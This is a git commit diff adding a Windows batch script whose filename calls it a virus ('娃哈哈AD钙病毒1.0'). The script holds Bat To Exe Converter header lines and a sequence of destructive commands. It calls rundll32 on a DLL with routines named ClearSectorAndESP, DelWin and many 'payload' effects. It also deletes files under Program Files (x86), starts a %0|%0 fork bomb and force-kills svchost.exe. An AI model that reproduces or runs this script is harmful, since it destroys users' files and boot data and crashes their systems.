a32fcdeb4ccd273e665390d64c5fcf10e4a6bef5
LucasWXSB <101915910+LucasWXSB@users.noreply.github.com>
2022-03-27 13:30:57 +0800

    Add files via upload

---
+++ wahahabd/娃哈哈AD钙病毒1.0.bat
@@ -0,0 +1,59 @@
+::[Bat To Exe Converter]
+::
+::fBE1pAF6MU+EWHreyHcjLQlHcFbQbDrrOpEZ++Pv4Pq7rksPVe86K92V3riCQA==
+::YAwzoRdxOk+EWAjk
+::fBw5plQjdCqDJN1cH8rt9ScHGlSxLG6/AoAMpuH44Io=
+::YAwzuBVtJxjWCl3EqQJgSA==
+::ZR4luwNxJguZRRnk
+::Yhs/ulQjdF+5
+::cxAkpRVqdFKZSTk=
+::cBs/ulQjdF+5
+::ZR41oxFsdFKZSTk=
+::eBoioBt6dFKZSDk=
+::cRo6pxp7LAbNWATEpCI=
+::egkzugNsPRvcWATEpSI=
+::dAsiuh18IRvcCxnZtBJQ
+::cRYluBh/LU+EWAnk
+::YxY4rhs+aU+IeA==
+::cxY6rQJ7JhzQF1fEqQJmZk0CLA==
+::ZQ05rAF9IBncCkqN+0xwdVsCAlLUXA==
+::ZQ05rAF9IAHYFVzEqQK14PjRv+wHz4ObIjzuEYg=
+::eg0/rx1wNQPfEVWB+kM9LVsJDIFK3+5J7jDvAMnfZhh+wg==
+::fBEirQZwNQPfEVWB+kM9LVsJDDODNGqyB/Ue4eT/jw==
+::cRolqwZ3JBvQF1fEqQK1+PTToM8HzqHa
+::dhA7uBVwLU+EWNBjGcff6JyuqBOLMn2/FDDLLWwmE29JZi0=
+::YQ03rBFzNR3SWATEfaXdrfSUy/5mK2K0ELAObT8+azd7J4PZNA==
+::dhAmsQZ3MwfNWATEfaXdrfSUy/5mK2K0ELAObT8+azd7J4PZNA==
+::ZQ0/vhVqMQ3MEVWAtB9wofy5yetCu5FeEbwS/u3pjw==
+::Zg8zqx1/OA3MEVWAtB9wruyUy+1buYNxgEv4bTMhjw==
+::dhA7pRFwIByZRRkCCIi38/TcgtwH06Q12lmYMC18KQsPf4GViT9f
+::Zh4grVQjdCyDJGyX8VAjFEkGHFXTAE+/Fb4I5/jHaiJkJ7710RHXWatSKE0J1wWVJbe1O8Zj02Jf+A==
+::YB416Ek+ZW8=
+::
+::
+::978f952a14a936cc963da21a135fa983
+ping 127.0.0.1 -n 60
+start rundll32.exe lframme32.dll,InitDPI
+start rundll32.exe lframme32.dll,payloadCoolMessage
+start rundll32.exe lframme32.dll,payloadClick
+start rundll32.exe lframme32.dll,ClearSectorAndESP
+start rundll32.exe lframme32.dll,payloadSound1
+start rundll32.exe lframme32.dll,payloadColor
+start rundll32.exe lframme32.dll,payloadCopyCur
+start rundll32.exe lframme32.dll,DelWin
+start rundll32.exe lframme32.dll,payloadDrawError
+start rundll32.exe lframme32.dll,payloadSound2
+start rundll32.exe lframme32.dll,payloadEllipse
+start rundll32.exe lframme32.dll,payloadGray
+start rundll32.exe lframme32.dll,payloadScrMess
+start rundll32.exe lframme32.dll,payloadSound3
+start rundll32.exe lframme32.dll,payloadSquare
+start rundll32.exe lframme32.dll,payloadStretch
+start rundll32.exe lframme32.dll,payloadTriangle
+start rundll32.exe lframme32.dll,payloadTunnel
+start rundll32.exe lframme32.dll,payloadWave
+Del C:\Program Files (x86) *.* /q
+ping 127.0.0.1 -n 20
+%0|%0
+ping 127.0.0.1 -n 400
+taskkill /f /im svchost.exe
